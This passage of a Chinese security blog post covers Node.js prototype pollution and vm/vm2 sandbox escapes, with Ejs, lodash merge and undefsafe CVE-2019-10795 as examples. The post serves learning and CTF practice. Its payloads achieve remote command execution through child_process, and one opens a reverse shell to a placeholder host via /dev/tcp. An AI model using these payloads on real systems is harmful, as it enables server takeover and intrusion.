<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6113">XNUCA2019 Hardjs题解 从原型链污染到RCE - 先知社区</a></li>
</ul>
<h1 id="哪种情况下可以进行原型链污染"><a href="#哪种情况下可以进行原型链污染" class="headerlink" title="哪种情况下可以进行原型链污染"></a>哪种情况下可以进行原型链污染</h1><p>如果 我们需要利用原型链污染 那我们就需要设置 <strong><strong>proto</strong></strong> 的值 也就是需要找到能控制数组的键名的操作 最常见的就是</p>
<ol>
<li>merge </li>
<li>clone </li>
<li>copy</li>
</ol>
<p>merge方法 是合并对象的方法 合并两个对象或者 多个对象的属性</p>
<pre><code class="highlight javascript"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;     
  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;         
    <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;             
      <span class="title function_">merge</span>(target[key], source[key])         
    &#125; 
    <span class="keyword">else</span> &#123;             
      target[key] = source[key]         
    &#125;     
  &#125; 
&#125;</code></pre>

<p>clone方法 就是克隆捏</p>
<h2 id="Merge-类操作导致原型链污染"><a href="#Merge-类操作导致原型链污染" class="headerlink" title="Merge 类操作导致原型链污染"></a>Merge 类操作导致原型链污染</h2><h3 id="merge-recursiveMerge-CVE-2020-28499"><a href="#merge-recursiveMerge-CVE-2020-28499" class="headerlink" title="merge.recursiveMerge CVE-2020-28499"></a>merge.recursiveMerge CVE-2020-28499</h3><p>此 CVE 影响 2.1.1 以下的 merge 版本</p>
<h2 id="Ejs-模块原型链污染"><a href="#Ejs-模块原型链污染" class="headerlink" title="Ejs 模块原型链污染"></a>Ejs 模块原型链污染</h2><blockquote>
<p>主要为两个函数的伪造：<br>opts.outputFunctionName<br>opts.escapeFunction</p>
</blockquote>
<h3 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h3><p>test.js</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);
<span class="keyword">var</span> _= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);
<span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);

<span class="keyword">var</span> app = <span class="title function_">express</span>();
<span class="comment">//设置模板的位置</span>
app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);

<span class="comment">//对原型进行污染</span>
<span class="keyword">var</span> malicious_payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;&#125;&#125;&#x27;</span>;
_.<span class="title function_">merge</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(malicious_payload));

<span class="comment">//进行渲染</span>
app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;
  res.<span class="property">render</span> (<span class="string">&quot;./test.ejs&quot;</span>,&#123;
    <span class="attr">message</span>: <span class="string">&#x27;lufei test &#x27;</span>
  &#125;);
&#125;);

<span class="comment">//设置http</span>
<span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8081</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;

  <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span>
  <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span>

  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)
&#125;);</code></pre>

<p>test.ejs</p>
<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>
<span class="tag">&lt;<span class="name">html</span>&gt;</span>
  <span class="tag">&lt;<span class="name">head</span>&gt;</span>
    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span>
    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span>
  <span class="tag">&lt;/<span class="name">head</span>&gt;</span>
  <span class="tag">&lt;<span class="name">body</span>&gt;</span>

    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&lt;%= message%&gt;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>

  <span class="tag">&lt;/<span class="name">body</span>&gt;</span>
<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>

<p>payload：</p>
<pre><code class="highlight javascript">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</code></pre>

<pre><code class="highlight javascript">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;</span>&#125;&#125;</code></pre>

<h3 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h3><pre><code class="highlight javascript">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;
  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);
  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;
    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;
      <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;
      <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;    
    &#125;;
  &#125;;
  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);
  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;
    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;login success!&#x27;</span>&#125;);  
  &#125;<span class="keyword">else</span>&#123;
    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;login fail!&#x27;</span>&#125;);  
  &#125;

&#125;);</code></pre>

<p>**<em>payload1</em>**：覆盖 opts.outputFunctionName , 这样构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE。</p>
<pre><code class="highlight javascript">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;a=1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); //&quot;</span>&#125;&#125;&#125;

&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); __tmp2&quot;</span>&#125;&#125;&#125;</code></pre>

<p>**<em>payload2</em>**：伪造 opts.escapeFunction 也可以进行 RCE</p>
<pre><code class="highlight javascript">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;client&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span>&#125;&#125;&#125;</code></pre>

<p><strong>补充:</strong> 在 ejs 模板中还有三个可控的参数, 分别为 opts.localsName 和 opts.destructuredLocals 和 opts.filename, 但是这三个无法构建出合适的污染链。</p>
<h2 id="Undefsafe-模块原型链污染（CVE-2019-10795）"><a href="#Undefsafe-模块原型链污染（CVE-2019-10795）" class="headerlink" title="Undefsafe 模块原型链污染（CVE-2019-10795）"></a>Undefsafe 模块原型链污染（CVE-2019-10795）</h2><p>Undefsafe 是 NodeJS 下的一个第三方模块，其2.0.3版本以下的存在原型链污染<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/jvkyvly/article/details/119911074">undefsafe原型链&amp;[网鼎杯 2020 青龙组]notes_Je3Z的博客-CSDN博客</a></p>
<h3 id="下载存在问题的版本模块："><a href="#下载存在问题的版本模块：" class="headerlink" title="下载存在问题的版本模块："></a>下载存在问题的版本模块：</h3><pre><code class="highlight javascript">npm install undefsafe@<span class="number">2.0</span><span class="number">.1</span></code></pre>

<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><pre><code class="highlight javascript"><span class="keyword">var</span> object = &#123;
    <span class="attr">a</span>: &#123;
        <span class="attr">b</span>: &#123;
            <span class="attr">c</span>: <span class="number">1</span>,
            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],
            <span class="attr">e</span>: <span class="string">&#x27;whoami&#x27;</span>
        &#125;
    &#125;
&#125;;
<span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">a</span>.<span class="property">b</span>.<span class="property">e</span>)

<span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">a</span>.<span class="property">c</span>.<span class="property">e</span>)</code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254757.png"><br>可以看到当我们正常访问 object 属性的时候会有正常的回显，但当我们访问不存在属性时则会得到报错<br>undefsafe 可以帮我们解决这个问题（undefsafe 本身就是用来解决报错使其不提示的)</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> undef = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);
<span class="keyword">var</span> object = &#123;
    <span class="attr">a</span>: &#123;
        <span class="attr">b</span>: &#123;
            <span class="attr">c</span>: <span class="number">1</span>,
            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],
            <span class="attr">e</span>: <span class="string">&#x27;whoami&#x27;</span>
        &#125;
    &#125;
&#125;;
<span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">a</span>.<span class="property">b</span>.<span class="property">e</span>)
<span class="comment">//whoami</span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">undef</span>(object,<span class="string">&#x27;a.b.e&#x27;</span>))
<span class="comment">//whoami</span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">undef</span>(object,<span class="string">&#x27;a.c.e&#x27;</span>))
<span class="comment">//undefined</span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">a</span>.<span class="property">c</span>.<span class="property">e</span>)
<span class="comment">//TypeError: Cannot read properties of undefined (reading &#x27;e&#x27;)</span></code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254806.png"><br>还有一个功能，在对对象赋值时，如果目标属性存在其可以帮助我们修改对应属性的值：</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> undef = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);
<span class="keyword">var</span> object = &#123;
    <span class="attr">a</span>: &#123;
        <span class="attr">b</span>: &#123;
            <span class="attr">c</span>: <span class="number">1</span>,
            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],
            <span class="attr">e</span>: <span class="string">&#x27;whoami&#x27;</span>
        &#125;
    &#125;
&#125;;
<span class="variable language_">console</span>.<span class="title function_">log</span>(object);
<span class="comment">//&#123; a: &#123; b: &#123; c: 1, d: [Array], e: &#x27;whoami&#x27; &#125; &#125; &#125;</span>
<span class="title function_">undef</span>(object,<span class="string">&quot;a.b.e&quot;</span>,<span class="string">&#x27;123&#x27;</span>);
<span class="variable language_">console</span>.<span class="title function_">log</span>(object);
<span class="comment">//&#123; a: &#123; b: &#123; c: 1, d: [Array], e: &#x27;123&#x27; &#125; &#125; &#125;</span></code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254584.png"><br>因此如果当属性不存在时，我们想对该属性赋值：</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> undef = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);
<span class="keyword">var</span> object = &#123;
    <span class="attr">a</span>: &#123;
        <span class="attr">b</span>: &#123;
            <span class="attr">c</span>: <span class="number">1</span>,
            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],
            <span class="attr">e</span>: <span class="string">&#x27;whoami&#x27;</span>
        &#125;
    &#125;
&#125;;
<span class="variable language_">console</span>.<span class="title function_">log</span>(object);
<span class="comment">//&#123; a: &#123; b: &#123; c: 1, d: [Array], e: &#x27;whoami&#x27; &#125; &#125; &#125;</span>
<span class="title function_">undef</span>(object,<span class="string">&quot;a.f.e&quot;</span>,<span class="string">&#x27;321&#x27;</span>);
<span class="variable language_">console</span>.<span class="title function_">log</span>(object);
<span class="comment">//&#123; a: &#123; b: &#123; c: 1, d: [Array], e: &#x27;whoami&#x27; &#125;, e: &#x27;321&#x27; &#125; &#125;</span></code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254067.png"><br>访问属性会在上层进行创建并赋值<br>通过以上演示我们可知，undefsafe 是一款支持设置值的函数，不过在 undefsafe 模块在小于2.0.3版本，这个功能处存在原型链污染漏洞（CVE-2019-10795)。<br>我们在 2.0.3 版本中进行测试：</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> undef = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);
<span class="keyword">var</span> object = &#123;
  <span class="attr">a</span>: &#123;
    <span class="attr">b</span>: &#123;
      <span class="attr">c</span>: <span class="number">1</span>,
      <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],
      <span class="attr">e</span>: <span class="string">&#x27;whoami&#x27;</span>
    &#125;
  &#125;
&#125;;
<span class="keyword">var</span> payload = <span class="string">&quot;__proto__.toString&quot;</span>;
<span class="title function_">undef</span>(object,payload,<span class="string">&quot;evilstring&quot;</span>);
<span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">toString</span>);
<span class="comment">// [Function: toString]</span></code></pre>

<p>但是如果在低于 2.0.3 版本运行，则会得到如下输出：<br><img src="http://oss.hehanzzz.icu/img/202405061254526.png"><br>可见，当 undefsafe() 函数的第 2，3 个参数可控时，我们便可以污染 object 对象中的值。</p>
<pre><code class="highlight javascript">![<span class="number">22</span>](../images/nodejs/<span class="number">22.</span>png)<span class="keyword">var</span> undef = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);
<span class="keyword">var</span> test = &#123;&#125;
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is &#x27;</span>+ test)    <span class="comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span>
<span class="comment">// this is [object Object]</span></code></pre>

<p>返回：[object Object]，并与this is进行拼接。但是当我们使用 undefsafe 的时候，可以对原型进行污染：</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> undef = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);
<span class="keyword">var</span> test = &#123;&#125;
<span class="title function_">undef</span>(test,<span class="string">&#x27;__proto__.toString&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="keyword">return</span> <span class="string">&#x27;just a evil!&#x27;</span>&#125;)
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is &#x27;</span>+ test)    <span class="comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span>
<span class="comment">// this is just a evil!</span></code></pre>



<h1 id="VM沙箱逃逸（待研究）"><a href="#VM沙箱逃逸（待研究）" class="headerlink" title="VM沙箱逃逸（待研究）"></a>VM沙箱逃逸（待研究）</h1><h2 id="vm模块"><a href="#vm模块" class="headerlink" title="vm模块"></a>vm模块</h2><p>vm 模块创建一个V8虚拟引擎 context（上下文、环境）来编译和运行代码。调用代码与被调用代码处于不同的 context，意味着它们的 global 对象是不同的。</p>
<pre><code class="highlight javascript"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);

<span class="comment">// global下定义一个 x 变量</span>
<span class="keyword">const</span> x = <span class="number">1</span>;

<span class="comment">// context也定义一个 x 变量</span>
<span class="keyword">const</span> context = &#123; <span class="attr">x</span>: <span class="number">2</span> &#125;;
vm.<span class="title function_">createContext</span>(context);          <span class="comment">// 语境化 &#123;x:2&#125;</span>

<span class="comment">// code包含的代码将在 context 下执行，所以其中所有代码访问的变量都是 context 下的</span>
<span class="keyword">const</span> code = <span class="string">&#x27;x += 40; var y = 17;&#x27;</span>;
vm.<span class="title function_">runInContext</span>(code, context);

<span class="comment">// context = &#123;x:42, y:17&#125;</span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(context.<span class="property">x</span>); <span class="comment">// 42</span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(context.<span class="property">y</span>); <span class="comment">// 17</span>

<span class="comment">// global没有被改动</span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 1; y is not defined.</span></code></pre>

<h2 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h2><p>当使用vm创建一个context时，不能访问golbal对象，但是我们可以利用对象带有的constructor属性逃逸。</p>
<pre><code class="highlight javascript"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);
<span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;</span>);
<span class="variable language_">console</span>.<span class="title function_">log</span>(env);</code></pre>

<p>第一次调constructor得到Object Contrustor，第二次调constructor得到Function Contrustor，就是一个构造函数了。这里构造的函数内的语句为return this.process.env，那么控制process之后就能RCE了。</p>
<pre><code class="highlight javascript"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);
<span class="keyword">const</span> xyz = vm.<span class="title function_">runInNewContext</span>(<span class="string">`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();</span>
<span class="string">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;).toString()`</span>);
<span class="variable language_">console</span>.<span class="title function_">log</span>(xyz);</code></pre>

<h2 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h2><pre><code class="highlight javascript"><span class="keyword">var</span> handler = &#123;
  get () &#123;
    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get&quot;</span>);
  &#125;
&#125;;
<span class="keyword">var</span> target = &#123;&#125;;
<span class="keyword">var</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(target, handler);

<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">has</span> = <span class="keyword">function</span>(<span class="params">t, k</span>)&#123;
  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;has&quot;</span>);
&#125;

proxy.<span class="property">a</span>; <span class="comment">//触发get</span>
<span class="string">&quot;&quot;</span> <span class="keyword">in</span> proxy; <span class="comment">//触发has，这个has是在原型链上定义的w</span></code></pre>

<pre><code class="highlight javascript"><span class="meta">&quot;use strict&quot;</span>;

<span class="keyword">var</span> process;

<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">has</span> = <span class="keyword">function</span> (<span class="params">t, k</span>) &#123;
  process = t.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);
&#125;;

<span class="string">&quot;&quot;</span> <span class="keyword">in</span> <span class="title class_">Buffer</span>.<span class="property">from</span>;
process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>()</code></pre>

<p>关于vm2的逃逸这里不过多赘述，师傅们可以自行参考。<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207283">vm2实现原理分析-安全客 - 安全资讯平台</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207291">vm2沙箱逃逸分析-安全客 - 安全资讯平台</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/anwen12/article/details/120445707">[node审计]nodevm2_node 调用vm2-CSDN博客</a></p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13065">NodeJs从零到一 - 先知社区</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12383">nodejs全覆盖 - 先知社区</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1631">奇安信攻防社区-NodeJS中的RCE的利用和绕过</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1561">奇安信攻防社区-prototype pollution attack</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11791">浅析NodeJS - 先知社区</a></p>

        </div>
    
<!-- tags -->

    <div class="post-meta">
        标签：
        
            <a href="/tags/NodeJS/"> / NodeJS</a>
        
    </div>

</div>
                <div class="footer">
    <span>Copyright © <script>document.write(new Date().getFullYear())</script> Hello Hehanzzz~</span>
    <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> with <a target="_blank" rel="noopener" href="https:///imzl.com/zenmind">ZenMind</a></span>
</div>

<link rel="stylesheet" href="/css/a11y-dark.min.css">


<script src="/js/highlight.min.js"></script>


<script src="/js/highlightjs-line-numbers.js"></script>

<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>

            </div>
        </div>
    </body>
</html>